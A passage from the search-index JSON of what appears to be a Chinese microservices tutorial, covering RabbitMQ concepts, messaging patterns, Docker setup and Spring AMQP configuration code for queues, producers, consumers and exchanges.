enabled: true # \u542f\u7528\u6d88\u8d39\u8005\u91cd\u8bd5\u673a\u5236 max-attempts: 5 # \u6700\u5927\u91cd\u8bd5\u6b21\u6570 initial-interval: 1000 # \u521d\u59cb\u91cd\u8bd5\u95f4\u9694\uff08\u6beb\u79d2\uff09 multiplier: 2.0 # \u6bcf\u6b21\u91cd\u8bd5\u95f4\u9694\u500d\u589e max-interval: 10000 # \u6700\u5927\u91cd\u8bd5\u95f4\u9694\uff08\u6beb\u79d2\uff09 default-requeue-rejected: false # \u8d85\u8fc7\u91cd\u8bd5\u6b21\u6570\u540e\u4e0d\u91cd\u65b0\u5165\u961f\uff0c\u907f\u514d\u6b7b\u5faa\u73af \u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u914d\u7f6e\u6b7b\u4fe1\u4ea4\u6362\u673a\u3002 \u6301\u4e45\u5316\u961f\u5217 \u5728 RabbitMQ \u4e2d\uff0c\u6301\u4e45\u5316\u961f\u5217\u7684\u76ee\u7684\u662f\u786e\u4fdd\u5373\u4f7f RabbitMQ \u670d\u52a1\u5668\u91cd\u542f\uff0c\u961f\u5217\u4e2d\u7684\u6d88\u606f\u4e5f\u4e0d\u4f1a\u4e22\u5931\u3002\u6301\u4e45\u5316\u529f\u80fd\u9002\u7528\u4e8e\u961f\u5217\u548c\u6d88\u606f\u4e24\u90e8\u5206\u3002 \u521b\u5efa\u961f\u5217\u65f6\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u5176\u4e3a\u6301\u4e45\u5316\u961f\u5217\u3002\u6301\u4e45\u5316\u961f\u5217\u4f1a\u88ab\u4fdd\u5b58\u5230\u78c1\u76d8\u4e2d\u3002 @Bean public Queue durableQueue() { return QueueBuilder.durable(\"durableQueue\").build(); // \u58f0\u660e\u6301\u4e45\u5316\u961f\u5217 } \u4e5f\u53ef\u4ee5\u8bbe\u5b9a\u6301\u4e45\u5316\u6d88\u606f\uff0c rabbitTemplate.convertAndSend(\"durableExchange\", \"durableKey\", \"Persistent Message\", message -> { message.getMessageProperties().setDeliveryMode(MessageDeliveryMode.PERSISTENT); // \u8bbe\u7f6e\u6d88\u606f\u6301\u4e45\u5316 return message; }); \u603b\u7ed3 Rabbit MQ \u662f\u4e00\u4e2a AMQP \u7684\u6d88\u606f\u961f\u5217\uff0c\u5b83\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u6d88\u606f\u961f\u5217\uff0c\u53ef\u4ee5\u7528\u4e8e\u6784\u5efa\u5206\u5e03\u5f0f\u7cfb\u7edf\u3002Rabbit MQ \u662f\u4e00\u4e2a\u6d88\u606f\u4e2d\u95f4\u4ef6\uff0c\u5b83\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u670d\u52a1\uff0c\u7528\u4e8e\u5b58\u50a8\u6d88\u606f\uff0c\u7136\u540e\u6d88\u8d39\u8005\u6d88\u8d39\u6d88\u606f\u3002Rabbit MQ \u6709\u516d\u79cd\u5e38\u89c1\u7684\u6d88\u606f\u961f\u5217\u4e0e\u4ea7\u9500\u8005\u7684\u7ec4\u7ec7\u65b9\u5f0f\uff0c\u5305\u62ec\u7f13\u51b2\u961f\u5217\uff0c\u5de5\u4f5c\u961f\u5217\uff0c\u6247\u51fa\u4ea4\u6362\u673a\uff0c\u8def\u7531\u4ea4\u6362\u673a\uff0c\u4e3b\u9898\u4ea4\u6362\u673a\u548c\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u3002\u8fd9\u4e9b\u6a21\u5f0f\u53ef\u4ee5\u6ee1\u8db3\u4e0d\u540c\u7684\u9700\u6c42\uff0c\u4f8b\u5982\uff0c\u8d1f\u8f7d\u5747\u8861\uff0c\u5e7f\u64ad\uff0c\u8def\u7531\u7b49\u3002\u8fd9\u91cc\uff0c\u6211\u4eec\u9664\u4e86\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff0c\u5176\u4ed6\u7684\u6a21\u5f0f\u90fd\u8fdb\u884c\u4e86\u5b9e\u73b0\u3002","title":"Rabbit MQ \u6d88\u606f\u961f\u5217"},{"location":"16/#ch16-rabbit-mq","text":"\u4ece\u8fd9\u7ae0\u8d77\uff0c\u6211\u4eec\u7684\u6807\u9898\u892a\u53bb Spring\uff0c\u53d8\u6210\u4e86\u5fae\u670d\u52a1\u901f\u6210\u3002\u76ee\u524d\u6211\u4eec\u4f9d\u7136\u57fa\u4e8e Spring \u6846\u67b6\uff0c\u4f46\u4e5f\u53ea\u662f\u4f17\u591a\u9009\u62e9\u4e4b\u4e00\u3002 Rabbit MQ \u662f\u4e00\u4e2a AMQP \u7684\u6d88\u606f\u961f\u5217\uff0c\u5b83\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u6d88\u606f\u961f\u5217\uff0c\u53ef\u4ee5\u7528\u4e8e\u6784\u5efa\u5206\u5e03\u5f0f\u7cfb\u7edf\u3002Rabbit MQ \u662f\u4e00\u4e2a\u6d88\u606f\u4e2d\u95f4\u4ef6\uff0c\u5b83\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u670d\u52a1\uff0c\u7528\u4e8e\u5b58\u50a8\u6d88\u606f\uff0c\u7136\u540e\u6d88\u8d39\u8005\u6d88\u8d39\u6d88\u606f\u3002 \u4e4b\u6240\u4ee5\u6211\u4eec\u8981\u5f15\u5165\u6d88\u606f\u961f\u5217\uff0c\u4e3b\u8981\u662f\u4e3a\u4e86\u89e3\u8026\u3002\u5728\u5fae\u670d\u52a1\u67b6\u6784\u4e2d\uff0c\u670d\u52a1\u4e4b\u95f4\u7684\u8c03\u7528\u662f\u901a\u8fc7 HTTP \u5b8c\u6210\u7684\uff0c\u8fd9\u6837\u5c31\u4f1a\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u670d\u52a1\u4e4b\u95f4\u7684\u8c03\u7528\u662f\u540c\u6b65\u7684\u3002\u5982\u679c\u4e00\u4e2a\u670d\u52a1\u6302\u4e86\uff0c\u90a3\u4e48\u8c03\u7528\u8005\u5c31\u4f1a\u7b49\u5f85\uff0c\u8fd9\u6837\u5c31\u4f1a\u5bfc\u81f4\u6574\u4e2a\u670d\u52a1\u90fd\u6302\u6389\u3002\u800c\u6d88\u606f\u961f\u5217\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\uff0c\u5b83\u662f\u5f02\u6b65\u7684\uff0c\u5373\u751f\u4ea7\u8005\u751f\u4ea7\u6d88\u606f\u540e\u5c31\u4e0d\u7ba1\u4e86\uff0c\u6d88\u8d39\u8005\u6d88\u8d39\u6d88\u606f\uff0c\u8fd9\u6837\u5c31\u89e3\u8026\u4e86\u3002\u6b64\u5916\uff0c\u6d88\u606f\u961f\u5217\u8fd8\u6709\u9500\u5cf0\u7684\u529f\u80fd\uff0c\u5373\u5728\u9ad8\u5cf0\u671f\uff0c\u6d88\u606f\u961f\u5217\u53ef\u4ee5\u7f13\u5b58\u6d88\u606f\uff0c\u7136\u540e\u5728\u4f4e\u5cf0\u671f\u6d88\u8d39\uff0c\u8fd9\u6837\u589e\u5f3a\u4e86\u7cfb\u7edf\u7684\u7a33\u5b9a\u6027\u3002\u5f53\u7136\uff0c\u5f15\u5165\u65b0\u7684\u4e2d\u95f4\u4ef6\u80af\u5b9a\u4f1a\u589e\u52a0\u590d\u6742\u5ea6\u548c\u4e0d\u7a33\u5b9a\u6027\uff0c\u56e0\u6b64\u8981\u6743\u8861\u3002 \u76f8\u6bd4\u5176\u5b83\u7684\u6d88\u606f\u961f\u5217\uff0cRabbit MQ \u6709\u4e00\u4e2a\u4f18\u70b9\uff0c\u5c31\u662f\u5b83\u662f AMQP \u7684\u5b9e\u73b0\u3002AMQP \u662f\u4e00\u4e2a\u6d88\u606f\u961f\u5217\u7684\u6807\u51c6\uff0c\u5b83\u89c4\u5b9a\u4e86\u6d88\u606f\u961f\u5217\u7684\u683c\u5f0f\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4fdd\u8bc1\u4e0d\u540c\u6d88\u606f\u961f\u5217\u4e4b\u95f4\u7684\u517c\u5bb9\u6027\u3002\u56e0\u6b64\uff0cRabbit MQ \u53ef\u4ee5\u548c\u5176\u5b83\u7684\u6d88\u606f\u961f\u5217\u517c\u5bb9\u3002Rabbit MQ \u4e5f\u6709\u5176\u5b83\u7684\u4f18\u70b9\uff0c\u4f8b\u5982\uff0c\u5b83\u652f\u6301\u96c6\u7fa4\uff0c\u652f\u6301\u6301\u4e45\u5316\uff0c\u652f\u6301\u4e8b\u52a1\uff0c\u652f\u6301\u63d2\u4ef6\u7b49\u3002\u8fd9\u4e9b\u4e30\u5bcc\u7684\u7279\u6027\u4f7f\u5f97\u5b83\u5e38\u7528\u4e8e\u5fae\u670d\u52a1\u67b6\u6784\u4e2d\u3002 \u6ce8\u610f\uff0c\u5230\u4e86\u8fd9\u4e00\u7ae0\u5f00\u59cb Java \u8bed\u8a00\u548c Spring \u6846\u67b6\u7684\u91cd\u8981\u6027\u4f1a\u9010\u6e10\u6de1\u5316\u3002\u5c3d\u7ba1\u73b0\u5728\u6211\u4eec\u8fd8\u662f\u4ee5 Spring \u6846\u67b6\u4e3a\u57fa\u7840\u8bb2 Rabbit MQ\uff0c\u4f46 Rabbit MQ \u5176\u5b9e\u517c\u5bb9\u5f88\u591a\u8bed\u8a00\u548c\u6846\u67b6\u3002\u4e4b\u540e\u7684\u6280\u672f\uff0c\u4f8b\u5982 graphQL \u548c gRPC\uff0c\u4e5f\u662f\u5982\u6b64\u3002\u800c\u5728\u6700\u540e\u4e00\u90e8\u5206 k8s \u4e2d\uff0c\u4e3a\u4e86\u5f00\u53d1\u6548\u7387\uff0c\u6211\u4eec\u5c06\u4f1a\u8f6c\u5411\u5176\u5b83\u8bed\u8a00\u548c\u6846\u67b6\u3002\u6b64\u5916\uff0c\u524d\u9762\u5b66\u4e60\u7684 Consul \u4e5f\u662f\u8fd9\u6837\u3002","title":"\u5fae\u670d\u52a1\u901f\u6210 Ch16 Rabbit MQ"},{"location":"16/#_1","text":"\u6d88\u606f\u961f\u5217\u4e2d\uff0c\u7ecf\u5e38\u8ba8\u8bba\u4ee5\u4e0b\u51e0\u4e2a\u6982\u5ff5\uff0c \u751f\u4ea7\u8005\uff08Producer\uff09\uff1a\u751f\u4ea7\u6d88\u606f\u7684\u670d\u52a1\uff0c\u7c7b\u4f3c\u4e8e\u4e4b\u524d\u54cd\u5e94\u5f0f\u7f16\u7a0b\u4e2d\u7684 Publisher \u6d88\u8d39\u8005\uff08Consumer\uff09\uff1a\u6d88\u8d39\u6d88\u606f\u7684\u670d\u52a1\uff0c\u7c7b\u4f3c\u4e8e\u4e4b\u524d\u54cd\u5e94\u5f0f\u7f16\u7a0b\u4e2d\u7684 Subscriber \u961f\u5217\uff08Queue\uff09\uff1a\u5b58\u50a8\u6d88\u606f\u7684\u5730\u65b9\uff0c\u751f\u4ea7\u8005\u751f\u4ea7\u6d88\u606f\u5230\u961f\u5217\uff0c\u6d88\u8d39\u8005\u6d88\u8d39\u6d88\u606f AMQP\uff1aAdvanced Message Queuing Protocol\uff0c\u6d88\u606f\u961f\u5217\u7684\u534f\u8bae\uff0cRabbit MQ \u5c31\u662f AMQP \u7684\u5b9e\u73b0 \u901a\u9053\uff08channel\uff09\uff1a\u751f\u4ea7\u8005\u548c\u6d88\u8d39\u8005\u4e4b\u95f4\u7684\u901a\u9053\uff0c\u751f\u4ea7\u8005\u901a\u8fc7\u901a\u9053\u53d1\u9001\u6d88\u606f\u5230\u961f\u5217\uff0c\u6d88\u8d39\u8005\u901a\u8fc7\u901a\u9053\u6d88\u8d39\u6d88\u606f \u4ea4\u6362\u673a\uff08Exchange\uff09\uff1a\u8f6c\u53d1\u6d88\u606f\u7684\u5730\u65b9\uff0c\u751f\u4ea7\u8005\u53d1\u9001\u6d88\u606f\u5230\u4ea4\u6362\u673a\uff0c\u4ea4\u6362\u673a\u5c06\u6d88\u606f\u53d1\u9001\u5230\u961f\u5217","title":"\u57fa\u672c\u6982\u5ff5"},{"location":"16/#rabbit-mq","text":"Rabbit MQ \u63d0\u4f9b\u4e86\u516d\u79cd\u5e38\u89c1\u7684\u6d88\u606f\u961f\u5217\u4e0e\u4ea7\u9500\u8005\u7684\u7ec4\u7ec7\u65b9\u5f0f\uff0c\u5305\u62ec\uff0c \u7f13\u51b2\u961f\u5217\uff08Buffer\uff09\uff1a\u5355\u4e2a\u751f\u4ea7\u8005\uff0c\u5355\u4e2a\u6d88\u8d39\u8005\u3002\u751f\u4ea7\u8005\u7684\u6d88\u606f\u53d1\u9001\u5230\u961f\u5217\uff0c\u6d88\u8d39\u8005\u4ece\u961f\u5217\u4e2d\u6d88\u8d39\u6d88\u606f\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u53ea\u8d77\u5230\u7f13\u51b2\u8bf7\u6c42\u7684\u4f5c\u7528\u3002 \u5de5\u4f5c\u961f\u5217\uff08Work Queue\uff09\uff1a\u5355\u4e2a\u751f\u4ea7\u8005\uff0c\u591a\u4e2a\u6d88\u8d39\u8005\u3002\u751f\u4ea7\u8005\u7684\u6d88\u606f\u53d1\u9001\u5230\u961f\u5217\uff0c\u591a\u4e2a\u6d88\u8d39\u8005\u4ece\u961f\u5217\u4e2d\u6d88\u8d39\u6d88\u606f\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u8d77\u5230\u4e86\u8d1f\u8f7d\u5747\u8861\u7684\u4f5c\u7528\u3002 \u6247\u51fa\u4ea4\u6362\u673a\uff08Fanout Exchange\uff09\uff1a\u5355\u4e2a\u751f\u4ea7\u8005\uff0c\u591a\u4e2a\u961f\u5217\uff0c\u591a\u4e2a\u6d88\u8d39\u8005\u3002\u751f\u4ea7\u8005\u7684\u6d88\u606f\u53d1\u9001\u5230\u4ea4\u6362\u673a\uff0c\u4ea4\u6362\u673a\u5c06\u6d88\u606f\u53d1\u9001\u5230\u6240\u6709\u7684\u961f\u5217\uff0c\u6bcf\u4e2a\u961f\u5217\u6709\u4e00\u4e2a\u6d88\u8d39\u8005\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u8d77\u5230\u4e86\u5e7f\u64ad\u7684\u4f5c\u7528\u3002 \u8def\u7531\u4ea4\u6362\u673a\uff08Direct Exchange\uff09\uff1a\u4e0e\u6247\u51fa\u4ea4\u6362\u673a\u7c7b\u4f3c\uff0c\u4f46\u662f\uff0c\u6d88\u606f\u4f1a\u9644\u5e26\u4e00\u4e2a routing key\uff0c\u4ea4\u6362\u673a\u4f1a\u6839\u636e routing key \u5c06\u6d88\u606f\u53d1\u9001\u5230\u5bf9\u5e94\u7684\u961f\u5217\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u8d77\u5230\u4e86\u8def\u7531\u7684\u4f5c\u7528\u3002 \u4e3b\u9898\u4ea4\u6362\u673a\uff08Topic Exchange\uff09\uff1a\u4e0e\u8def\u7531\u4ea4\u6362\u673a\u7c7b\u4f3c\uff0c\u4f46\u662f\uff0crouting key \u662f\u4e00\u4e2a\u901a\u914d\u7b26\uff0c\u4ea4\u6362\u673a\u4f1a\u6839\u636e\u901a\u914d\u7b26\u5c06\u6d88\u606f\u53d1\u9001\u5230\u5bf9\u5e94\u7684\u961f\u5217\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u4f9d\u7136\u662f\u8def\u7531\u7684\u4f5c\u7528\u3002 \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff08RPC\uff09\uff1a\u751f\u4ea7\u8005\u53d1\u9001\u6d88\u606f\u5230\u961f\u5217\uff0c\u6d88\u8d39\u8005\u6d88\u8d39\u6d88\u606f\u540e\uff0c\u518d\u53d1\u9001\u6d88\u606f\u5230\u53e6\u4e00\u4e2a\u961f\u5217\uff0c\u751f\u4ea7\u8005\u518d\u6d88\u8d39\u6d88\u606f\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u8d77\u5230\u4e86 RPC \u7684\u4f5c\u7528\u3002 \u5176\u4e2d\uff0c\u6247\u51fa\u4ea4\u6362\u673a\uff0c\u8def\u7531\u4ea4\u6362\u673a\u4e0e\u4e3b\u9898\u4ea4\u6362\u673a\u7edf\u79f0\u4e3a\u8ba2\u9605\u53d1\u5e03\u6a21\u5f0f\uff08Publish/Subscribe\uff09\uff0c\u5b83\u4eec\u662f\u6d88\u606f\u961f\u5217\u4e2d\u6700\u5e38\u89c1\u7684\u6a21\u5f0f\u3002","title":"Rabbit MQ \u516d\u5927\u6a21\u578b"},{"location":"16/#_2","text":"\u4f9d\u7136\u4f7f\u7528 docker \u6765\u542f\u52a8 Rabbit MQ\uff0c services: rabbitmq: image: rabbitmq:4.0-rc-management environment: - RABBITMQ_DEFAULT_USER=user - RABBITMQ_DEFAULT_PASS=password ports: - 15672:15672 - 5672:5672 15672 \u662f\u7ba1\u7406\u7684 WebUI\uff0c 5672 \u662f AMQP \u7684\u7aef\u53e3\u3002 \u4e0b\u6587\u4e2d\uff0c\u4f60\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 admin \u8d26\u6237\uff0c\u4f46\u662f\u4e3a\u4e86\u5b89\u5168\uff0c\u6700\u597d\u8fd8\u662f\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u8d26\u6237\u3002","title":"\u9879\u76ee\u914d\u7f6e"},{"location":"16/#rabbit-mq_1","text":"Rabbit MQ \u7ba1\u7406\u754c\u9762\u53ef\u4ee5\u8fdb\u884c\u6d88\u606f\u7684\u67e5\u770b\uff0c\u961f\u5217\u7684\u67e5\u770b\uff0c\u7528\u6237\u7684\u7ba1\u7406\u7b49\u3002\u5728\u6d4f\u89c8\u5668\u4e2d\u8f93\u5165 http://localhost:15672 \uff0c\u8f93\u5165\u8d26\u6237\u5bc6\u7801\uff0c\u5373\u53ef\u8fdb\u5165\u7ba1\u7406\u754c\u9762\u3002\u521b\u5efa\u7528\u6237\u5f88\u7b80\u5355\uff0c\u8f93\u5165\u7528\u6237\u540d\uff0c\u5bc6\u7801\u548c\u6743\u9650\u5373\u53ef\u3002 \u6ce8\u610f\uff0c\u53ea\u6709 Admin \u6216\u8005 Management \u6743\u9650\u7684\u7528\u6237\u624d\u80fd\u8fdb\u5165\u7ba1\u7406\u754c\u9762\u3002 \u6b64\u5916\uff0cRabbit MQ \u6709\u4e00\u4e2a\u529f\u80fd\uff0c\u53eb Virtual Host\uff0c\u8fd9\u662f\u7528\u6765\u9694\u79bb\u4e0d\u540c\u7684\u670d\u52a1\u7684\uff0c\u53ef\u4ee5\u7c7b\u6bd4\u4e8e\u6570\u636e\u5e93\u4e2d\uff0c\u5148\u5206\u5e93\uff0c\u518d\u5206\u8868\u3002\u5728 Rabbit MQ \u4e2d\uff0c\u5148\u5206 Virtual Host\uff0c\u518d\u5206 Queue\u3002Virtual Host \u662f\u4e00\u4e2a\u903b\u8f91\u6982\u5ff5\uff0c\u5b83\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u7a7a\u95f4\uff0c\u4e0d\u540c\u7684 Virtual Host \u4e4b\u95f4\u662f\u9694\u79bb\u7684\u3002\u5728 Rabbit MQ \u7ba1\u7406\u754c\u9762\u4e2d\uff0c\u53ef\u4ee5\u521b\u5efa Virtual Host\u3002 \u7136\u540e\uff0c\u70b9\u51fb\u7528\u6237\u7ba1\u7406\u754c\u9762\u7684\u7528\u6237\u540d\uff0c\u8fdb\u5165\u7528\u6237\u8be6\u60c5\uff0c\u4f7f\u7528 Set Permission \u6765\u8bbe\u7f6e\u7528\u6237\u80fd\u591f\u8bbf\u95ee\u7684 Virtual Host\u3002","title":"Rabbit MQ \u7ba1\u7406\u754c\u9762"},{"location":"16/#_3","text":"\u73b0\u5728\uff0c\u6211\u4eec\u4f7f\u7528 Spring AMQP \u6765\u5b9e\u73b0\u4e00\u4e2a\u7f13\u51b2\u961f\u5217\u6a21\u5f0f\u3002\u9996\u5148\uff0c\u6dfb\u52a0\u4f9d\u8d56\uff0c implementation 'org.springframework.amqp:spring-rabbit:3.1.7' \u5982\u679c\u662f\u76f4\u63a5\u4f7f\u7528 Rabbit MQ\uff0c\u53ef\u4ee5\u7528\u4e0b\u6587\u7684\u4ee3\u7801\uff0c ConnectionFactory connectionFactory = new CachingConnectionFactory(); AmqpAdmin admin = new RabbitAdmin(connectionFactory); admin.declareQueue(new Queue(\"myqueue\")); AmqpTemplate template = new RabbitTemplate(connectionFactory); template.convertAndSend(\"myqueue\", \"foo\"); String foo = (String) template.receiveAndConvert(\"myqueue\"); \u4f46\u662f\uff0c\u80af\u5b9a\u662f\u4f7f\u7528 Spring Bean \u624d\u66f4\u5408\u7406\u3002 package io.github.fingerbone; import org.springframework.amqp.core.AmqpAdmin; import org.springframework.amqp.core.AmqpTemplate; import org.springframework.amqp.core.Queue; import org.springframework.amqp.rabbit.connection.CachingConnectionFactory; import org.springframework.amqp.rabbit.connection.ConnectionFactory; import org.springframework.amqp.rabbit.core.RabbitAdmin; import org.springframework.amqp.rabbit.core.RabbitTemplate; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; @Configuration public class RabbitConfig { @Bean public ConnectionFactory connectionFactory() { var factory = new CachingConnectionFactory(); factory.setHost(\"localhost\"); factory.setUsername(\"user\"); factory.setPassword(\"password\"); factory.setVirtualHost(\"/\"); return factory; } @Bean public AmqpAdmin amqpAdmin() { return new RabbitAdmin(connectionFactory()); } @Bean public AmqpTemplate amqpTemplate() { return new RabbitTemplate(connectionFactory()); } @Bean public Queue foodQueue() { return new Queue(\"food\"); } } \u5982\u679c\u4f60\u9700\u8981\u521b\u5efa\u591a\u4e2a Queue\uff0c\u4f7f\u7528\u6211\u4eec\u4e4b\u524d\u8bb2\u4f9d\u8d56\u6ce8\u5165\u7684\u76f8\u5173\u77e5\u8bc6\u5373\u53ef\u3002 @Bean(\"queue1\") public Queue queue1() { return new Queue(\"queue1\"); } @Bean(\"queue2\") public Queue queue2() { return new Queue(\"queue2\"); } \u7136\u540e\u6211\u4eec\u6dfb\u52a0\u4e00\u4e2a\u751f\u4ea7\u8005\uff0c @RestController @RequiredArgsConstructor public class ProducerController { private final RabbitTemplate rabbitTemplate; @GetMapping(\"/apple\") public Mono<Void> apple() { rabbitTemplate.convertAndSend(\"food\", \"apple\"); return Mono.empty(); } } \u8c03\u7528\u540e\uff0c\u53ef\u4ee5\u53d1\u73b0\u6d88\u606f\u5df2\u7ecf\u53d1\u9001\u5230\u4e86\u961f\u5217\u4e2d\u3002 \u7136\u540e\u6211\u4eec\u6dfb\u52a0\u4e00\u4e2a\u6d88\u8d39\u8005\uff0c\u4f7f\u7528 @RabbitListener \u6ce8\u89e3\uff0c\u6765\u76d1\u542c\u961f\u5217\u3002 @Component @RequiredArgsConstructor public class Consumer { @RabbitListener(queues = \"food\") @RabbitHandler public void consume(String message) { System.out.println(\"Yummy! I ate \" + message); } } @RabbitListener \u6ce8\u89e3\u7528\u6765\u76d1\u542c\u961f\u5217\uff0c queues \u53c2\u6570\u7528\u6765\u6307\u5b9a\u961f\u5217\u540d\uff0c @RabbitHandler \u6ce8\u89e3\u7528\u6765\u6307\u5b9a\u5904\u7406\u65b9\u6cd5\u3002\u5982\u679c\u52a0 @RabbitListener \u5230\u7c7b\u4e0a\uff0c\u5b83\u4f1a\u4f5c\u7528\u5728\u6240\u6709\u65b9\u6cd5\u4e0a\u3002\u6b64\u65f6\uff0c\u5982\u679c\u6709\u591a\u4e2a\u6d88\u8d39\u8005\uff0c\u90a3\u4e48\u6d88\u606f\u9ed8\u8ba4\u4f1a\u88ab\u5e73\u5747\u5206\u914d\u5230\u6bcf\u4e2a\u6d88\u8d39\u8005\u3002\u6d88\u8d39\u8005\u5904\u7406\u4e86\u6d88\u606f\u540e\uff0c\u6d88\u606f\u5c31\u4f1a\u4ece\u961f\u5217\u4e2d\u5220\u9664\u3002 Rabbit MQ \u662f\u5b8c\u7f8e\u8f6c\u53d1\u7684\uff0c\u5982\u679c\u4f60\u4e4b\u524d\u4f20\u9012\u4e00\u4e2a\u522b\u7684\u5bf9\u8c61\uff0c\u90a3\u4e48\u8fd9\u91cc\u4e5f\u4f1a\u63a5\u6536\u5230\u8fd9\u4e2a\u5bf9\u8c61\u3002\u4f8b\u5982\uff0c\u4f60\u4f20\u9012\u4e86\u4e00\u4e2a Apple \u5bf9\u8c61\uff0c\u90a3\u4e48\u8fd9\u91cc\u4e5f\u4f1a\u63a5\u6536\u5230\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u4e0d\u8fc7\u4f60\u9700\u8981\u628a\u53c2\u6570\u6539\u6210\u5bf9\u5e94\u7684\u7c7b\u578b\u3002 \u5982\u679c\u4f60\u7684\u751f\u4ea7\u8005\u548c\u6d88\u8d39\u8005\u4f7f\u7528\u4e0d\u540c\u7684\u8bed\u8a00\uff0c\u90a3\u4e48\u4f60\u9700\u8981\u4f7f\u7528\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u3002Rabbit MQ \u9ed8\u8ba4\u4f7f\u7528\u7684\u662f Java \u7684\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\uff0c\u4f46\u662f\u8fd9\u79cd\u65b9\u5f0f\u4e0d\u591f\u901a\u7528\uff0c\u56e0\u6b64\uff0c\u4f60\u9700\u8981\u4f7f\u7528 JSON \u6216\u8005 Protobuf \u7b49\u65b9\u5f0f\u3002\u4f7f\u7528 MessageConverter \u6765\u6307\u5b9a\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u7684\u65b9\u5f0f\u3002 @Bean public MessageConverter messageConverter() { return new Jackson2JsonMessageConverter(); } \u7136\u540e\uff0c\u4f60\u9700\u8981\u5728 RabbitTemplate \u4e2d\u6307\u5b9a MessageConverter\uff0c @Bean public AmqpTemplate amqpTemplate() { var template = new RabbitTemplate(connectionFactory()); template.setMessageConverter(messageConverter()); return template; }","title":"\u7f13\u51b2\u961f\u5217\u6a21\u5f0f"},{"location":"16/#_4","text":"\u5de5\u4f5c\u961f\u5217\u6a21\u5f0f\u662f\u591a\u4e2a\u6d88\u8d39\u8005\u6d88\u8d39\u540c\u4e00\u4e2a\u961f\u5217\u7684\u6d88\u606f\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u8d77\u5230\u4e86\u8d1f\u8f7d\u5747\u8861\u7684\u4f5c\u7528\u3002\u5728 Rabbit MQ \u4e2d\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u6d88\u8d39\u8005\u7684\u6570\u91cf\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5b9e\u73b0\u8d1f\u8f7d\u5747\u8861\u3002 @Bean public SimpleRabbitListenerContainerFactory rabbitListenerContainerFactory() { var factory = new SimpleRabbitListenerContainerFactory(); factory.setConnectionFactory(connectionFactory()); factory.setConcurrentConsumers(3); factory.setMaxConcurrentConsumers(10); return factory; } SimpleRabbitListenerContainerFactory \u662f\u7528\u6765\u8bbe\u7f6e\u6d88\u8d39\u8005\u7684\u6570\u91cf\u7684\uff0c setConcurrentConsumers \u662f\u8bbe\u7f6e\u521d\u59cb\u6d88\u8d39\u8005\u7684\u6570\u91cf\uff0c setMaxConcurrentConsumers \u662f\u8bbe\u7f6e\u6700\u5927\u6d88\u8d39\u8005\u7684\u6570\u91cf\u3002 \u5982\u679c\u4f60\u4f7f\u7528\u7684\u5fae\u670d\u52a1\u67b6\u6784\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u4f7f\u7528 Kubernetes \u6765\u81ea\u52a8\u6269\u5bb9\u6d88\u8d39\u8005\u7684\u6570\u91cf\u3002\u5982\u679c\u662f Spring Cloud\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u4f7f\u7528 Spring Cloud Stream \u6765\u81ea\u52a8\u6269\u5bb9\u6d88\u8d39\u8005\u7684\u6570\u91cf\u3002","title":"\u5de5\u4f5c\u961f\u5217\u6a21\u5f0f"},{"location":"16/#_5","text":"\u6247\u51fa\u4ea4\u6362\u673a\u6a21\u5f0f\u662f\u4e00\u4e2a\u751f\u4ea7\u8005\u53d1\u9001\u6d88\u606f\u5230\u4e00\u4e2a\u4ea4\u6362\u673a\uff0c\u4ea4\u6362\u673a\u5c06\u6d88\u606f\u53d1\u9001\u5230\u591a\u4e2a\u961f\u5217\uff0c\u6bcf\u4e2a\u961f\u5217\u6709\u4e00\u4e2a\u6d88\u8d39\u8005\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u8d77\u5230\u4e86\u5e7f\u64ad\u7684\u4f5c\u7528\u3002 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u4ea4\u6362\u673a\uff0c @Bean public FanoutExchange fanoutExchange() { return new FanoutExchange(\"fanout\"); } \u8fd9\u91cc\u7684\u4ea4\u6362\u673a\u662f FanoutExchange\u3002\u4ea4\u6362\u673a\u7684\u7c7b\u578b\u6709\u56db\u79cd\uff0c\u5206\u522b\u662f DirectExchange\uff0cFanoutExchange\uff0cTopicExchange \u548c HeadersExchange\u3002\u524d\u4e09\u79cd\u5bf9\u5e94\u4e86\u8def\u7531\u4ea4\u6362\u673a\uff0c\u6247\u51fa\u4ea4\u6362\u673a\u548c\u4e3b\u9898\u4ea4\u6362\u673a\u3002\u6700\u540e\u4e00\u79cd\u662f HeadersExchange\uff0c\u5b83\u662f\u6839\u636e\u6d88\u606f\u5934\u6765\u8def\u7531\u7684\uff0c\u8fd9\u91cc\u4e0d\u505a\u8bb2\u89e3\u3002 \u4f60\u4e5f\u53ef\u4ee5\u5728 Rabbit MQ 